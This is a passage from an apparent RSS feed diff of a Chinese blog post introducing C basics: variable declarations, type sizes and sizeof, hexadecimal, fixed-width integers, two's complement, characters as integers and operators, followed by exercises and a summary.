-</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">grade</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">score</span> <span class="o">=</span> <span class="mf">95.5</span><span class="p">;</span>
-</span></span></code></pre></div><p>声明的一般形式是：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">类型 变量名 = 初始值;
-</span></span></code></pre></div><p>类型决定了编译器如何解释这块数据，以及通常需要读取多少字节。</p>
-<h2 id="3-常用数据类型">
-<a class="header-anchor" href="#3-%e5%b8%b8%e7%94%a8%e6%95%b0%e6%8d%ae%e7%b1%bb%e5%9e%8b"></a>
-3. 常用数据类型
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">short</span> <span class="n">s</span> <span class="o">=</span> <span class="mi">100</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">1000</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="n">l</span> <span class="o">=</span> <span class="mi">10000</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">long</span> <span class="kt">long</span> <span class="n">ll</span> <span class="o">=</span> <span class="mi">100000</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">float</span> <span class="n">f</span> <span class="o">=</span> <span class="mf">3.14f</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">double</span> <span class="n">d</span> <span class="o">=</span> <span class="mf">3.1415926</span><span class="p">;</span>
-</span></span></code></pre></div><p>在常见 Linux x86-64 环境中：</p>
-<table>
-  <thead>
-      <tr>
-          <th>类型</th>
-          <th style="text-align: right">常见大小</th>
-      </tr>
-  </thead>
-  <tbody>
-      <tr>
-          <td><code>char</code></td>
-          <td style="text-align: right">1 字节</td>
-      </tr>
-      <tr>
-          <td><code>short</code></td>
-          <td style="text-align: right">2 字节</td>
-      </tr>
-      <tr>
-          <td><code>int</code></td>
-          <td style="text-align: right">4 字节</td>
-      </tr>
-      <tr>
-          <td><code>long</code></td>
-          <td style="text-align: right">8 字节</td>
-      </tr>
-      <tr>
-          <td><code>long long</code></td>
-          <td style="text-align: right">8 字节</td>
-      </tr>
-      <tr>
-          <td><code>float</code></td>
-          <td style="text-align: right">4 字节</td>
-      </tr>
-      <tr>
-          <td><code>double</code></td>
-          <td style="text-align: right">8 字节</td>
-      </tr>
-      <tr>
-          <td>指针</td>
-          <td style="text-align: right">8 字节</td>
-      </tr>
-  </tbody>
-</table>
-<p>这些大小与平台和 ABI 有关，应该用 <code>sizeof</code> 验证：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;char: %zu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;int: %zu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;long: %zu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;pointer: %zu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="4-位字节和十六进制">
-<a class="header-anchor" href="#4-%e4%bd%8d%e5%ad%97%e8%8a%82%e5%92%8c%e5%8d%81%e5%85%ad%e8%bf%9b%e5%88%b6"></a>
-4. 位、字节和十六进制
-</h2><p>现代计算机中通常有：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1 byte = 8 bit
-</span></span></code></pre></div><p>一个 bit 只能取 <code>0</code> 或 <code>1</code>。一个字节共有 <code>2^8 = 256</code> 种状态。</p>
-<p>十六进制很适合表示内存：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">1 个十六进制数字 = 4 bit
-</span></span><span class="line"><span class="cl">2 个十六进制数字 = 1 byte
-</span></span></code></pre></div><p>C 中的十六进制整数以 <code>0x</code> 开头：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
-</span></span></code></pre></div><p><code>a</code> 和 <code>b</code> 的值相同。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;decimal: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;hex: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
-</span></span></code></pre></div><h2 id="5-固定宽度整数">
-<a class="header-anchor" href="#5-%e5%9b%ba%e5%ae%9a%e5%ae%bd%e5%ba%a6%e6%95%b4%e6%95%b0"></a>
-5. 固定宽度整数
-</h2><p>处理二进制数据时，常用 <code>&lt;stdint.h&gt;</code> 中的类型：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">uint8_t</span>  <span class="n">a</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">uint16_t</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">uint32_t</span> <span class="n">c</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">uint64_t</span> <span class="n">d</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int8_t</span>  <span class="n">e</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int32_t</span> <span class="n">f</span> <span class="o">=</span> <span class="o">-</span><span class="mi">100</span><span class="p">;</span>
-</span></span></code></pre></div><ul>
-<li><code>u</code> 表示无符号；</li>
-<li>数字表示位数；</li>
-<li><code>_t</code> 表示这是一个类型名。</li>
-</ul>
-<h2 id="6-有符号无符号与补码">
-<a class="header-anchor" href="#6-%e6%9c%89%e7%ac%a6%e5%8f%b7%e6%97%a0%e7%ac%a6%e5%8f%b7%e4%b8%8e%e8%a1%a5%e7%a0%81"></a>
-6. 有符号、无符号与补码
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">signed_value</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">unsigned_value</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
-</span></span></code></pre></div><p>32 位整数的常见范围：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">int32_t：  -2^31 ～ 2^31-1
-</span></span><span class="line"><span class="cl">uint32_t： 0 ～ 2^32-1
-</span></span></code></pre></div><p>现代计算机通常使用补码表示负数。以 8 位的 <code>-5</code> 为例：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"> 5       = 00000101
-</span></span><span class="line"><span class="cl">按位取反 = 11111010
-</span></span><span class="line"><span class="cl">加一     = 11111011
-</span></span></code></pre></div><p>同一组字节可以被解释成有符号数或无符号数。因此，分析表达式时必须同时关注“值”和“类型”。</p>
-<h2 id="7-字符本质上也是整数">
-<a class="header-anchor" href="#7-%e5%ad%97%e7%ac%a6%e6%9c%ac%e8%b4%a8%e4%b8%8a%e4%b9%9f%e6%98%af%e6%95%b4%e6%95%b0"></a>
-7. 字符本质上也是整数
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">ch</span> <span class="o">=</span> <span class="sc">&#39;A&#39;</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;character: %c</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;decimal: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">ch</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;hex: 0x%x</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="p">)</span><span class="n">ch</span><span class="p">);</span>
-</span></span></code></pre></div><p>ASCII 中常见值：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&#39;A&#39;  = 65 = 0x41
-</span></span><span class="line"><span class="cl">&#39;a&#39;  = 97 = 0x61
-</span></span><span class="line"><span class="cl">&#39;0&#39;  = 48 = 0x30
-</span></span><span class="line"><span class="cl">&#39;\n&#39; = 10 = 0x0a
-</span></span></code></pre></div><h2 id="8-基础运算符">
-<a class="header-anchor" href="#8-%e5%9f%ba%e7%a1%80%e8%bf%90%e7%ae%97%e7%ac%a6"></a>
-8. 基础运算符
-</h2><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sum</span> <span class="o">=</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sub</span> <span class="o">=</span> <span class="n">a</span> <span class="o">-</span> <span class="n">b</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">mul</span> <span class="o">=</span> <span class="n">a</span> <span class="o">*</span> <span class="n">b</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">div</span> <span class="o">=</span> <span class="n">a</span> <span class="o">/</span> <span class="n">b</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">mod</span> <span class="o">=</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span><span class="p">;</span>
-</span></span></code></pre></div><p>整数除法会舍弃小数部分：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">5</span> <span class="o">/</span> <span class="mi">2</span><span class="p">);</span>       <span class="c1">// 2
-</span></span></span><span class="line"><span class="cl"><span class="nf">printf</span><span class="p">(</span><span class="s">&#34;%f</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mf">5.0</span> <span class="o">/</span> <span class="mf">2.0</span><span class="p">);</span>   <span class="c1">// 2.500000
-</span></span></span></code></pre></div><p>比较运算符：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">==  !=  &gt;  &lt;  &gt;=  &lt;=
-</span></span></code></pre></div><p>逻辑运算符：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&amp;&amp;  ||  !
-</span></span></code></pre></div><p>位运算符：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">&amp;  |  ^  ~  &lt;&lt;  &gt;&gt;
-</span></span></code></pre></div><p>例如判断最低位：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="n">value</span> <span class="o">&amp;</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;odd</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><h2 id="本篇练习">
-<a class="header-anchor" href="#%e6%9c%ac%e7%af%87%e7%bb%83%e4%b9%a0"></a>
-本篇练习
-</h2><ol>
-<li>编写程序打印所有基础类型的 <code>sizeof</code>。</li>
-<li>输入一个整数，分别以十进制和十六进制输出。</li>
-<li>输出字符 <code>A</code>、<code>a</code>、<code>0</code> 的数值。</li>
-<li>使用位运算判断一个整数的奇偶性。</li>
-<li>分别使用 <code>int32_t</code> 和 <code>uint32_t</code> 保存数据并观察输出。</li>
-</ol>
-<h2 id="本篇小结">
-<a class="header-anchor" href="#%e6%9c%ac%e7%af%87%e5%b0%8f%e7%bb%93"></a>
-本篇小结
-</h2><ul>
-<li>C 程序从 <code>main</code> 开始执行；</li>
-<li>类型决定数据的大小和解释方式；</li>
-<li>内存以字节为基本观察单位；</li>
-<li>十六进制便于表示地址和原始字节；</li>
-<li>字符也是整数；</li>
-<li>阅读整数表达式时必须关注位宽和符号属性。</li>
-</ul>
-<h2 id="下一篇">
-<a class="header-anchor" href="#%e4%b8%8b%e4%b8%80%e7%af%87"></a>
-下一篇
-</h2><p>下一篇学习条件、循环、函数、作用域和按值传递，让程序真正具备处理逻辑。</p>
-
-        
-        <hr><p>本文2026-09-08首发于<a href='https://blog.m15tak3.com/'>M15tak3のBlog</a>，最后修改于2026-09-08</p><p>本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！</p>]]>
       </description>
       
         <category>CTF</category><category>技术</category>
